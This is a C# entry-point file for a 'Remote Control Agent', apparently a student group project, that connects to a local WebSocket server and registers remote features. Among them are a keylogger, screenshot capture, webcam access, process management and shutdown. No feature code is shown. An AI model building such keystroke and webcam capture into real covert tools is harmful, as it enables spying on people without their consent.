// Program.cs
using RemoteControlAgent.Features;

namespace RemoteControlAgent
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            Console.WriteLine("Remote Control Agent - Nhóm 7");
            Console.WriteLine("Đang khởi động...");

            var socketClient = new SocketClient("ws://localhost:8080/agent"); // Thay IP Server
            var agent = new AgentController(socketClient);

            // Đăng ký các chức năng
            agent.RegisterFeature(new AppManager());
            agent.RegisterFeature(new ProcessManager());
            agent.RegisterFeature(new ScreenshotFeature());
            agent.RegisterFeature(new Keylogger());
            agent.RegisterFeature(new ShutdownFeature());
            agent.RegisterFeature(new Webcam());

            await socketClient.ConnectAsync();
            Console.WriteLine("Agent đã sẵn sàng. Nhấn phím bất kỳ để thoát...");
            Console.ReadKey();
        }
    }
}